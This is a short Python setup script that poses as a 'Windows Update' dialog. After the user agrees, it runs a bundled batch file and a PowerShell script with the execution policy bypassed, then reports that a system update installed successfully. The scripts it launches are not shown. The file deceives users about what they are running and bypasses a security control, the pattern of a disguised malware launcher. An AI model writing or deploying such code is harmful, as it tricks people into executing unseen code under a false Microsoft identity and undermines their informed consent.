# System/setup.py
import tkinter as tk
from tkinter import messagebox
import subprocess
import os

def is_python_installed():
    try:
        subprocess.run(["python", "--version"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=True)
        return True
    except:
        return False

def install_python():
    bat_path = os.path.join(os.path.dirname(__file__), "install_python.bat")
    subprocess.run([bat_path], shell=True, check=True)

def create_shortcut():
    ps_path = os.path.join(os.path.dirname(__file__), "create_shortcut.ps1")
    subprocess.run(["powershell", "-ExecutionPolicy", "Bypass", "-File", ps_path], shell=True)

# GUI Consent
root = tk.Tk()
root.withdraw()

confirm = messagebox.askyesno(
    "Windows Update",
    "A system compatibility update is ready.\nIt may take a few minutes to complete.\n\nDo you want to continue?"
)

if confirm:
    try:
        if not is_python_installed():
            install_python()
        create_shortcut()
        messagebox.showinfo("Update Complete", "System update installed successfully.")
    except Exception as e:
        messagebox.showerror("Error", f"Update failed: {e}")
else:
    messagebox.showinfo("Cancelled", "Update canceled.")
